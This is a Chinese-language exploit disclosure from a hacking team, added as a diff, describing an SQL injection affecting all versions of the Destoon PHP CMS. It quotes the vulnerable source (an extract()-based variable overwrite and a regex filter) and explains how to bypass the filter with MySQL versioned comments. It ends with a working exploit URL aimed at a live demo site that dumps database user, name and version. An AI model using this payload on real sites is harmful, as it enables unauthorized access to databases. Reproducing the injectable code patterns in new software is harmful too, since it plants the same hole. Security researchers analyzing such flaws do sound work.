@@ -1,0 +1,76 @@
+     
+                           
+                       .::Destoon最新全版本通杀SQL注入漏洞::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+				
+                  [+] HSID: FF000-HSDB-0004
+                  [+] Author: Kavia <kavia#ff0000.cc>
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2013-10-10
+                _______________________________________________
+
+
+                                  -= Main =-
+
+文件：/common.inc.php 64行：
+  if($_POST) $_POST = strip_sql($_POST);	//strip_sql()过滤
+  if($_GET) $_GET = strip_sql($_GET);
+  if($_COOKIE) $_COOKIE = strip_sql($_COOKIE);
+  .........
+  if($_POST) extract($_POST, EXTR_SKIP);	//注册变量
+  if($_GET) extract($_GET, EXTR_SKIP);
+
+
+跟进strip_sql()
+
+文件：/include/global.func.php	186行：
+  function strip_sql($string) {
+
+  $search = array("/union([[:space:]\/])/i","/select([[:space:]\/])/i","/update([[:space:]\/])/i","/replace([[:space:]\/])/i","/delete([[:space:]\/])/i","/drop([[:space:]\/])/i","/outfile([[:space:]\/])/i","/dumpfile([[:space:]\/])/i","/load_file\(/i","/substring\(/i","/ascii\(/i","/hex\(/i","/ord\(/i","/char\(/i");
+
+  $replace = array('unio&#110;\\1','selec&#116;\\1','updat&#101;\\1','replac&#101;\\1','delet&#101;\\1','dro&#112;\\1','outfil&#101;\\1','dumpfil&#101;\\1','load_fil&#101;(','substrin&#103;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');
+
+  return is_array($string) ? array_map('strip_sql', $string) : preg_replace($search, $replace, $string);
+
+  }
+
+
+采用了新的正则表达式，之前西毒放出的exp，已经无法绕过新版本的过滤了。
+此处可采用新的绕过方式：/!5000union*/
+
+文件：/module/member/record.inc.php 16行：
+  isset($mid) or $mid = 0;
+  isset($currency) or $currency = '';
+  $module_select = module_select('mid', $L['module_name'], $mid);
+  if($keyword) $condition .= " AND title LIKE '%$keyword%'";
+  if($fromtime) $condition .= " AND paytime>".(strtotime($fromtime.' 00:00:00'));
+  if($totime) $condition .= " AND paytime<".(strtotime($totime.' 23:59:59'));
+  if($mid) $condition .= " AND moduleid=$mid";
+  if($itemid) $condition .= " AND itemid=$itemid";
+  if($currency) $condition .= " AND currency='$currency'";
+  $r = $db->get_one("SELECT COUNT(*) AS num FROM {$DT_PRE}finance_pay WHERE $condition");//
+  $pages = pages($r['num'], $page, $pagesize);
+  $lists = array();
+  echo "SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize";
+  $result = $db->query("SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize");
+
+
+此处利用变量覆盖，就可以顺利构造sql注入
+
+文件：/member/record.php
+  <?php 
+  require 'config.inc.php';
+  require '../common.inc.php';
+  require DT_ROOT.'/module/'.$module.'/record.inc.php';
+  ?>
+
+
+引入了common.inc.php，所以存在变量覆盖。并且可以绕过正则的过滤。最终造成sql注入
+
+
+EXP：
+http://demo.destoon.com/v5.0/member/record.php?action=pay&mid=-1/*!50000union*//*!50000select*/user(),2,database(),version(),5,6,7,8,9--
